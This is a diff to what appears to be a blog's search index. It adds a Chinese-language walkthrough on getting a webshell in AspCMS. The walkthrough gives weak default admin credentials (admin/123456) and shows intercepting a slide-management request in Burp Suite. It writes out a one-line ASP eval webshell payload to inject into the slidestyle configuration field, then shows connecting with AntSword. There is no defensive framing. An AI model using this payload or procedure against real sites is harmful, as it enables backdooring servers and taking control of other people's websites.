@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>aspcms拿webshell</title>
+      <link href="/archives/d8c67745.html"/>
+      <url>/archives/d8c67745.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>网站中的配置文件，如果可在后台里进行修改，如果没有任何过滤，可以在里面写入而已的语句，即可<br>获取webshell。</p><p><strong>注</strong>：注意闭合问题，因为配置文件在网站中是全局调用，如果写错，网站会错误。无法访问。<br>在aspcms可以修改 如果是字符类型填写双引号闭合 如果是数字</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br><span class="line"><span class="string">%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br></pre></td></tr></table></figure><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>一样的，通过弱口令进入到后台。<br>账号：admin 密码：123456<br><img src="https://pic.888888.al/i/2023/03/03/kglyj8.jpg" alt="0"></p><h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>点击<strong>拓展功能-&gt;幻灯片管理</strong>，打开<strong>burpsuit</strong>进行抓包。<br><img src="https://pic.888888.al/i/2023/03/03/khq2hk.jpg" alt="1"><br>在<strong>slidestyle</strong>的后面写入一句话木马，注意闭合问题，并进行URL-encode。<br><img src="https://pic.888888.al/i/2023/03/03/kjiypm.jpg" alt="2"><br>放包，用蚁剑尝试连接，连接成功。<br><img src="https://pic.888888.al/i/2023/03/03/kk3gui.jpg" alt="3"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> webshell </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>dedecms后台拿webshell</title>
       <link href="/archives/226c5523.html"/>
       <url>/archives/226c5523.html</url>
